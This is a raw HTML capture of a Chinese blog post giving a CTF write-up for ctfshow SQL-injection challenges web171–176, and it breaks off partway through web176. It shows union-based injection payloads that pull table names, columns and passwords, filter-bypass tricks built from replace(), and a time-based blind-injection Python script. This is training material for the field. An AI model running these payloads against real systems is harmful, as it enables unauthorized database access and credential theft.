<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">






  
  
    
    
  <script async src="/lib/pace/pace.min.js?v=1.0.2"></script>
  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">








<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />










  <meta name="baidu-site-verification" content="OTG88475E6" />









  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />


<link href="https://fonts.loli.net/css?family=EB+Garamond:400,400i,700,700i|Noto+Serif+SC:400,500,700&display=swap&subset=chinese-simplified" rel="stylesheet">




<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next%20.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="学习记录,ctf,web,ctfshow," />





  <link rel="alternate" href="/atom.xml" title="孤桜懶契" type="application/atom+xml" />






<meta name="description" content="前言 记录web的题目wp，慢慢变强，铸剑。  SQL注入web171  根据语句可以看到有flag没有被显示出来，让我们拼接语句来绕过   12&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &amp;#x">
<meta property="og:type" content="article">
<meta property="og:title" content="【ctfshow】web篇-SQL注入 wp">
<meta property="og:url" content="https://gylq.gitee.io/posts/88.html">
<meta property="og:site_name" content="孤桜懶契">
<meta property="og:description" content="前言 记录web的题目wp，慢慢变强，铸剑。  SQL注入web171  根据语句可以看到有flag没有被显示出来，让我们拼接语句来绕过   12&#x2F;&#x2F;拼接sql语句查找指定ID用户$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &amp;#x">
<meta property="og:image" content="https://gylq.gitee.io/cloudimages/img/image-20210706204027073~1.jpg">
<meta property="article:published_time" content="2021-08-08T23:19:42.556Z">
<meta property="article:modified_time" content="2022-05-20T03:47:45.673Z">
<meta property="article:author" content="孤桜懶契">
<meta property="article:tag" content="学习记录">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="web">
<meta property="article:tag" content="ctfshow">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gylq.gitee.io/cloudimages/img/image-20210706204027073~1.jpg">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":true},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":true,"transition":{"post_block":"flipYIn","post_header":"perspectiveRightIn","post_body":"perspectiveLeftIn","coll_header":"swoopIn","sidebar":"shrinkIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="https://gylq.gitee.io/posts/88.html"/>





<!-- 设置文章需要密码访问 -->
<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back();
            }
        }
    })();
</script>

  <title>【ctfshow】web篇-SQL注入 wp | 孤桜懶契</title>
  





<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?b56c2f3ac99ab0c4efa4cba7755ec64a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>





  
      <!-- 球型气泡标签云 -->
      <script type="text/javascript" src="/js/src/bubble.js"></script>
  

  
      <!-- haoyuePlayer 播放器，移动端大小适配-->
      <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
  


<meta name="generator" content="Hexo 4.2.1"></head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  

  
  
    
  

  <div class="container sidebar-position-left page-post-detail">
    <div class="headband"></div>

    <!--fork me from github-->
    <a href="https://github.com/GYLQ" target="_blank" rel="noopener" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#64CEAA; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">孤桜懶契</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <h1 class="site-subtitle" itemprop="description">Run</h1>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-导航">
          <a href="/gylq-navigation/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-heartbeat"></i> <br />
            
            导航
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-links">
          <a href="/links/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
            
            友链
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off"
             placeholder="搜索..." spellcheck="false"
             type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>






<link href="/css/DPlayer.min.css" rel="stylesheet">
<script src="/js/src/DPlayer.min.js"></script>
<script src="/js/src/hls.min.js"></script>
<script>
    function __create__dps(videos) {
        for (i = 0; i < videos.length; i++) {
            new DPlayer({
                container: document.getElementById('__dp' + i),
                screenshot: true,
                video: {
                    url: videos[i]
                }
            });
        }
        // 修正 Mirages 1.7.10 视频比例错误
        setTimeout(() => {
            let __elementList = document.querySelectorAll('.video-container.video-4-3');
            for (let __element of __elementList) {
                __element.className = 'video-container video-16-9';
                __element.setAttribute('style', 'position: initial;');
            }
        }, 300);
    }
</script>
<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
<script>LA.init({id: "Jo9BKDWYSJy9xykG",ck: "Jo9BKDWYSJy9xykG"})</script> </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
		<div id="container">
		  <div id="content" class="content">
			

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://gylq.gitee.io/posts/88.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="孤桜懶契">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/qq.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="孤桜懶契">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">【ctfshow】web篇-SQL注入 wp</h2>
        

        <div class="post-meta">
          <span class="post-time">

             

             

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-08-09T07:19:42+08:00">
                2021-08-09
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index">
                    <span itemprop="name">CTF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/posts/88.html#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/posts/88.html" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          
             <span id="/posts/88.html" class="leancloud_visitors" data-flag-title="【ctfshow】web篇-SQL注入 wp">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          <!--
          
          -->

          
            <span class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                <span title="字数">
                  18.2k
                </span>
              

              

              
            </span>
          

          <!-- 隐藏文章内标题下，内容描述
          
          -->

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      
        <div class="post-gallery" itemscope itemtype="http://schema.org/ImageGallery">
          
          
            <div class="post-gallery-row">
              <a class="post-gallery-img fancybox"
                 href="https://gylq.gitee.io/cloudimages/img/image-20210706204027073~1.jpg" rel="gallery_cla13er0r0134ckrp6etncgd0"
                 itemscope itemtype="http://schema.org/ImageObject" itemprop="url">
                <img src="https://gylq.gitee.io/cloudimages/img/image-20210706204027073~1.jpg" itemprop="contentUrl"/>
              </a>
            
          

          
          </div>
        </div>
      

      
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>记录web的题目wp，慢慢变强，铸剑。</p>
</blockquote>
<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><blockquote>
<ul>
<li><strong>根据语句可以看到有flag没有被显示出来，让我们拼接语句来绕过</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;拼接sql语句查找指定ID用户</span><br><span class="line">$sql &#x3D; &quot;select username,password from user where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>GET传参会自己解码，注释可以用%23（#）, –空格,–+等，或者拼接语句不用注释也行</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052118542.png" alt="image-20210727052118542"></p>
<ul>
<li><strong>判断有3个字段</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' order by 3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052202385.png" alt="image-20210727052202385"></p>
<ul>
<li><strong>联合查询，查表</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052424376.png" alt="image-20210727052424376"></p>
<ul>
<li>查字段</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'ctfshow_user'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052509428.png" alt="image-20210727052509428"></p>
<ul>
<li>查flag</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727052648926.png" alt="image-20210727052648926"></p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!=='flag')&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>多了层过滤，没有检测到username有flag结果才能查询成功，不查询username，就用password，和上题没区别</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user2<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><blockquote>
<ul>
<li>和上题一样</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">password</span> <span class="keyword">from</span> ctfshow_user3<span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match('/flag|[0-9]/i', json_encode($ret)))&#123;</span><br><span class="line">      $ret['msg']='查询成功';</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><strong>过滤了数字，考察replace的运用，先判断有几个字段</strong></li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; order by 2 %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091147187.png" alt="image-20210727091147187"></p>
<blockquote>
<ul>
<li><strong>联合函数添加a和b两个数据ok</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091245501.png" alt="image-20210727091245501"></p>
<blockquote>
<ul>
<li>先构造一个replace将0-9全部置换</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="keyword">replace</span>(<span class="number">1234567890</span>,<span class="number">1</span>,<span class="string">'numA'</span>),<span class="number">2</span>,<span class="string">'numB'</span>),<span class="number">3</span>,<span class="string">'numC'</span>),<span class="number">4</span>,<span class="string">'numD'</span>),<span class="number">5</span>,<span class="string">'numE'</span>),<span class="number">6</span>,<span class="string">'numF'</span>),<span class="number">7</span>,<span class="string">'numG'</span>),<span class="number">8</span>,<span class="string">'numH'</span>),<span class="number">9</span>,<span class="string">'numI'</span>),<span class="string">'0'</span>,<span class="string">'numJ'</span>);</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091509981.png" alt="image-20210727091509981"></p>
<blockquote>
<ul>
<li>查表构造语句将1-0换成table_name</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(table_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.tables where table_schema&#x3D;database() %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091702800.png" alt="image-20210727091702800"></p>
<blockquote>
<ul>
<li>查字段名</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union all select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(group_concat(column_name),1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;ctfshow_user4&#39; %23</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091826089.png" alt="image-20210727091826089"></p>
<blockquote>
<ul>
<li>查结果</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; union select &#39;a&#39;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,1,&#39;numA&#39;),2,&#39;numB&#39;),3,&#39;numC&#39;),4,&#39;numD&#39;),5,&#39;numE&#39;),6,&#39;numF&#39;),7,&#39;numG&#39;),8,&#39;numH&#39;),9,&#39;numI&#39;),&#39;0&#39;,&#39;numJ&#39;) from ctfshow_user4--+</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091848759.png" alt="image-20210727091848759"></p>
<blockquote>
<ul>
<li>写个小py来转换一下</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flagstr = <span class="string">'ctfshow&#123;numHnumEbnumCnumFenumJd-anumEnumHnumF-numDfbnumC-adnumBnumJ-enumAnumAnumBenumDnumFnumDnumGnumHnumAnumH&#125;'</span></span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">flag = flag + flagstr.replace(<span class="string">'numA'</span>,<span class="string">'1'</span>).\</span><br><span class="line">    replace(<span class="string">'numB'</span>,<span class="string">'2'</span>)\</span><br><span class="line">    .replace(<span class="string">'numC'</span>,<span class="string">'3'</span>)\</span><br><span class="line">    .replace(<span class="string">'numD'</span>,<span class="string">'4'</span>)\</span><br><span class="line">    .replace(<span class="string">'numE'</span>,<span class="string">'5'</span>)\</span><br><span class="line">    .replace(<span class="string">'numF'</span>,<span class="string">'6'</span>)\</span><br><span class="line">    .replace(<span class="string">'numG'</span>,<span class="string">'7'</span>)\</span><br><span class="line">    .replace(<span class="string">'numH'</span>,<span class="string">'8'</span>)\</span><br><span class="line">    .replace(<span class="string">'numI'</span>,<span class="string">'9'</span>)\</span><br><span class="line">    .replace(<span class="string">'numJ'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>

<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210727091931245.png" alt="image-20210727091931245"></p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[\x00-\x7f]/i'</span>, json_encode($ret)))&#123;</span><br><span class="line">      $ret[<span class="string">'msg'</span>]=<span class="string">'查询成功'</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>将ascii所有字符都禁了，无回显就用盲注，写个py脚本</li>
</ul>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/30</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">"http://bab11107-9d31-46bf-b41e-0a04bb92b155.challenge.ctf.show:8080/api/v5.php"</span></span><br><span class="line">dict = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-"</span></span><br><span class="line">flag =<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dict:</span><br><span class="line">        payload= <span class="string">f"?id=1' and if(substr((select password from ctfshow_user5 where username=\"flag\"),<span class="subst">&#123;i&#125;</span>,1)=\"<span class="subst">&#123;j&#125;</span>\",sleep(3),0)--+"</span></span><br><span class="line">        res_get = url + payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.get(url=res_get)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end-start &gt; <span class="number">3</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210730095850795.png" alt="image-20210730095850795"></p>
</blockquote>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><blockquote>
<ul>
<li><strong>发现是对select的过滤，但是没有过滤大小写</strong></li>
</ul>
</blockquote>
<ul>
<li>表</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1' union all <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">Select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>字段</li>
</ul>
